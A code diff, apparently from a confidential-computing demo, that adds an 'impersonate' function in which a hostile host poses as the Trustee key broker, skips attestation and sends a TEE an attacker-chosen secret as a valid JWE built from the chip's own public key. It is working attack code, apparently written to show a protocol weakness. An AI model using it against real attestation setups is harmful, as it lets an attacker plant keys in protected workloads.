@@ -107,3 +107,35 @@ def attest(kbs, chip_lines, send, tamper_evidence=None):
         return
     log("KBS released the secret as a JWE encrypted to the chip's TEE key, forwarding it")
     send("JWE " + " ".join(jwe[k] for k in ("protected", "encrypted_key", "iv", "ciphertext", "tag")))
+
+def impersonate(chip_lines, send, secret=b"attacker's disk key: all yours!!"):
+    """A hostile host that never contacts Trustee. It plays KBS itself and sends the chip a secret it
+    chose, encrypted to the TEE key from the chip's own message. Anyone can encrypt to a public key."""
+    from cryptography.hazmat.primitives.asymmetric import ec
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    from cryptography.hazmat.primitives.keywrap import aes_key_wrap
+    import hashlib, os
+
+    def b64d(s):
+        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
+
+    assert next(chip_lines) == "HELLO"
+    send(f"NONCE {b64url(os.urandom(32))}")
+    _, x, y = next(chip_lines).split()
+    next(chip_lines)                                       # the evidence: the fake KBS ignores it
+    log("pretending to be Trustee: no attestation, sending a key the attacker chose")
+
+    # ECDH-ES+A256KW + A256GCM, exactly as KBS builds it (RFC 7518).
+    chip_key = ec.EllipticCurvePublicNumbers(int.from_bytes(b64d(x), "big"), int.from_bytes(b64d(y), "big"),
+                                             ec.SECP256R1()).public_key()
+    eph = ec.generate_private_key(ec.SECP256R1())
+    alg = b"ECDH-ES+A256KW"
+    kek = hashlib.sha256(b"\0\0\0\1" + eph.exchange(ec.ECDH(), chip_key) + len(alg).to_bytes(4, "big") + alg
+                         + bytes(8) + (256).to_bytes(4, "big")).digest()
+    cek, iv = os.urandom(32), os.urandom(12)
+    nums = eph.public_key().public_numbers()
+    protected = b64url(json.dumps({"alg": alg.decode(), "enc": "A256GCM", "epk": {
+        "crv": "P-256", "kty": "EC", "x": b64url(nums.x.to_bytes(32, "big")),
+        "y": b64url(nums.y.to_bytes(32, "big"))}}, separators=(",", ":")).encode())  # compact, like KBS
+    sealed = AESGCM(cek).encrypt(iv, secret, protected.encode())
+    send(f"JWE {protected} {b64url(aes_key_wrap(kek, cek))} {b64url(iv)} {b64url(sealed[:-16])} {b64url(sealed[-16:])}")
